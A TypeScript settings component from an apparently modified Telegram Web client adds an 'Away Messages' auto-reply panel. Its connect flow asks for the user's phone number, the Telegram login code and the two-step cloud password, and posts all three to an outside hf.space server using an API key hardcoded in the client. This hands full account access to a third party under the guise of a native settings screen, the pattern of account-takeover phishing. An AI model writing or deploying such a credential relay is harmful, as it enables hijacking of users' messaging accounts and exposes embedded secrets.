import type { FC } from '../../../lib/teact/teact';
import { memo, useState, useCallback, useEffect } from '../../../lib/teact/teact';
import { withGlobal } from '../../../global';

import Button from '../../ui/Button';
import InputText from '../../ui/InputText';
import './Settings.scss';

const BACKEND_URL = "https://kmt285476-telegram.hf.space"; 
const API_KEY = "tg_custom_secret_key_2026";

type OwnProps = { onReset: () => void; };
type StateProps = { 
  currentUserId?: string;
  currentUserPhone?: string; 
};

const AutoReplySettings: FC<OwnProps & StateProps> = ({ currentUserId, currentUserPhone }) => {
  const safeUserId = currentUserId || "unknown";

  const [isFetching, setIsFetching] = useState(true);
  const [isLinked, setIsLinked] = useState(false);
  const [isEnabled, setIsEnabled] = useState(false);
  const [replyText, setReplyText] = useState("I am currently unavailable. I will reply to you later.");
  
  const [step, setStep] = useState<'idle' | 'otp' | '2fa'>(() => {
    return (localStorage.getItem(`ar_setup_step_${safeUserId}`) as any) || 'idle';
  });
  const [savedPhone, setSavedPhone] = useState(() => localStorage.getItem(`ar_setup_phone_${safeUserId}`) || '');
  
  const [otpCode, setOtpCode] = useState('');
  const [twoFaPassword, setTwoFaPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  useEffect(() => {
    if (safeUserId === "unknown") return;
    const fetchSettings = async () => {
      try {
        const res = await fetch(`${BACKEND_URL}/api/get_auto_reply`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
          body: JSON.stringify({ user_id: safeUserId })
        });
        const data = await res.json();
        if (res.ok && data.is_linked) {
          setIsLinked(true);
          setIsEnabled(data.enabled);
          if (data.text) setReplyText(data.text);
        } else {
          setIsLinked(false);
        }
      } catch (err) {
      } finally {
        setIsFetching(false);
      }
    };
    fetchSettings();
  }, [safeUserId]);

  const handleCancelSetup = useCallback(() => {
    setStep('idle');
    setOtpCode('');
    setTwoFaPassword('');
    setErrorMsg('');
    localStorage.removeItem(`ar_setup_step_${safeUserId}`);
    localStorage.removeItem(`ar_setup_phone_${safeUserId}`);
  }, [safeUserId]);

  const handleAutoRequestCode = async () => {
    if (!currentUserPhone) {
        setErrorMsg("Phone number not found.");
        return;
    }
    setErrorMsg('');
    const formattedPhone = currentUserPhone.startsWith('+') ? currentUserPhone : `+${currentUserPhone}`;
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/request_code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ phone_number: formattedPhone })
      });
      if (res.ok) {
        setStep('otp');
        setSavedPhone(formattedPhone);
        localStorage.setItem(`ar_setup_step_${safeUserId}`, 'otp');
        localStorage.setItem(`ar_setup_phone_${safeUserId}`, formattedPhone);
      } else {
        const data = await res.json();
        setErrorMsg(data.error || "Failed to request code.");
      }
    } catch (err) { setErrorMsg("Network Error."); }
    setIsLoading(false);
  };

  const handleVerifyCode = async () => {
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/verify_code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ user_id: safeUserId, phone_number: savedPhone, otp_code: otpCode, two_step_password: twoFaPassword || undefined })
      });
      const data = await res.json();
      if (res.ok) {
        handleCancelSetup(); 
        setIsLinked(true);
        setIsEnabled(true);
      } else if (res.status === 401 && data.error === "2FA_REQUIRED") {
        setStep('2fa');
      } else {
        setErrorMsg(data.error || "Verification failed.");
      }
    } catch (err) { setErrorMsg("Network Error."); }
    setIsLoading(false);
  };

  const handleSaveSettings = async () => {
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/update_auto_reply`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ user_id: safeUserId, enabled: isEnabled, text: replyText })
      });
      if (!res.ok) {
        setIsLinked(false);
        setStep('idle');
        setErrorMsg("Session expired. Please reconnect.");
      }
    } catch (err) { setErrorMsg("Failed to save."); }
    setIsLoading(false);
  };

  if (isFetching) return null;

  // 🌟 [၁] Connect Server / OTP UI (ရှင်းလင်းသပ်ရပ်စွာ)
  if (!isLinked) {
    return (
      <div className="settings-content custom-scroll">
        <div className="settings-header">
          <h3 className="settings-header-title">Away Messages</h3>
        </div>
        <div style={{ padding: '32px 24px', boxSizing: 'border-box' }}>
            {errorMsg && <div style={{ color: '#df3f40', fontSize: '14px', marginBottom: '24px', textAlign: 'center' }}>{errorMsg}</div>}
            
            <div style={{ width: '100%', maxWidth: '320px', margin: '0 auto' }}>
                <div style={{ fontSize: '20px', fontWeight: 500, marginBottom: '8px', color: 'var(--color-text, #000)', textAlign: 'center' }}>
                    {step === 'idle' ? "Connect Server" : step === 'otp' ? "Enter Code" : "2FA Password"}
                </div>
                <div style={{ color: 'var(--color-text-secondary, #707579)', marginBottom: '32px', fontSize: '15px', textAlign: 'center', lineHeight: '1.5' }}>
                    {step === 'idle' ? "Enable auto-reply for your private messages." : "Please verify your account to continue."}
                </div>

                {step === 'otp' && <div style={{ marginBottom: '24px' }}><InputText label="OTP Code" value={otpCode} onChange={(e: any) => setOtpCode(e.target.value)} /></div>}
                {step === '2fa' && <div style={{ marginBottom: '24px' }}><InputText label="Cloud Password" type="password" value={twoFaPassword} onChange={(e: any) => setTwoFaPassword(e.target.value)} /></div>}

                <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                    <Button onClick={step === 'idle' ? handleAutoRequestCode : handleVerifyCode} isLoading={isLoading} fluid>
                        {step === 'idle' ? "REQUEST CODE" : "CONTINUE"}
                    </Button>
                    {step !== 'idle' && <Button color="danger" className="translucent" onClick={handleCancelSetup} disabled={isLoading} fluid>CANCEL</Button>}
                </div>
            </div>
        </div>
      </div>
    );
  }

  // 🌟 [၂] Main Settings UI (Global CSS Override မဖြစ်အောင် သီးသန့်ရေးဆွဲထားသည်)
  return (
    <div className="settings-content custom-scroll">
      <div className="settings-header">
        <h3 className="settings-header-title">Away Messages</h3>
      </div>
      
      {/* settings-main-menu class ကိုဖြုတ်ပြီး ကိုယ်ပိုင် Layout ကိုအသုံးပြုထားသည် */}
      <div style={{ padding: '20px', boxSizing: 'border-box', width: '100%' }}>
        
        {/* Toggle Switch Component */}
        <div 
          onClick={() => setIsEnabled(!isEnabled)}
          style={{ 
            display: 'flex', alignItems: 'center', justifyContent: 'space-between', 
            padding: '16px', backgroundColor: 'var(--color-background, #ffffff)', 
            borderRadius: '12px', border: '1px solid var(--color-borders, #dfe1e5)',
            cursor: 'pointer', marginBottom: '24px', boxSizing: 'border-box',
            width: '100%'
          }}
        >
          {/* Spans အစား Block Elements များကို သုံးထားသဖြင့် စာပူးခြင်း လုံးဝမဖြစ်တော့ပါ */}
          <div style={{ flex: 1, paddingRight: '16px', boxSizing: 'border-box' }}>
            <div style={{ fontSize: '16px', fontWeight: 500, color: 'var(--color-text, #000000)', marginBottom: '4px', display: 'block' }}>
              Enable Auto-Reply
            </div>
            <div style={{ fontSize: '14px', color: 'var(--color-text-secondary, #707579)', lineHeight: '1.4', display: 'block' }}>
              Reply automatically to private chats.
            </div>
          </div>

          {/* iOS / Telegram ပုံစံ Switch */}
          <div style={{ 
            width: '48px', height: '28px', borderRadius: '14px', 
            backgroundColor: isEnabled ? 'var(--color-primary, #3390ec)' : '#c4c9cc',
            position: 'relative', transition: 'background-color 0.3s ease', flexShrink: 0 
          }}>
            <div style={{ 
              width: '24px', height: '24px', backgroundColor: '#ffffff', borderRadius: '50%',
              position: 'absolute', top: '2px', left: isEnabled ? '22px' : '2px',
              transition: 'left 0.3s ease', boxShadow: '0 2px 4px rgba(0,0,0,0.2)'
            }} />
          </div>
        </div>

        {/* Textarea Component */}
        <div style={{ opacity: isEnabled ? 1 : 0.5, pointerEvents: isEnabled ? 'auto' : 'none', transition: 'opacity 0.3s ease', boxSizing: 'border-box', width: '100%' }}>
          <div style={{ fontSize: '14px', fontWeight: 600, color: 'var(--color-primary, #3390ec)', marginBottom: '10px', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
            Message Content
          </div>
          <textarea
            value={replyText}
            onChange={(e: any) => setReplyText(e.target.value)}
            disabled={!isEnabled}
            style={{
              width: '100%', minHeight: '130px', padding: '16px', fontSize: '15px', 
              borderRadius: '12px', border: '1px solid var(--color-borders, #dfe1e5)',
              backgroundColor: 'var(--color-background, #ffffff)', color: 'var(--color-text, #000000)',
              outline: 'none', resize: 'vertical', lineHeight: '1.5', fontFamily: 'inherit',
              boxSizing: 'border-box'
            }}
          />
          <div style={{ fontSize: '13px', color: 'var(--color-text-secondary, #707579)', marginTop: '8px' }}>
            You can write a long message. Drag the corner to resize the box.
          </div>
        </div>

        <div style={{ marginTop: '32px', boxSizing: 'border-box', width: '100%' }}>
            {errorMsg && <div style={{ color: '#df3f40', textAlign: 'center', marginBottom: '16px', fontSize: '14px' }}>{errorMsg}</div>}
            <Button onClick={handleSaveSettings} isLoading={isLoading} fluid>SAVE SETTINGS</Button>
        </div>

      </div>
    </div>
  );
};

export default memo(withGlobal<OwnProps>((global): StateProps => { 
    const { currentUserId, users } = global;
    return { 
        currentUserId, 
        currentUserPhone: (currentUserId && users?.byId?.[currentUserId]?.phoneNumber) || undefined 
    }; 
})(AutoReplySettings));
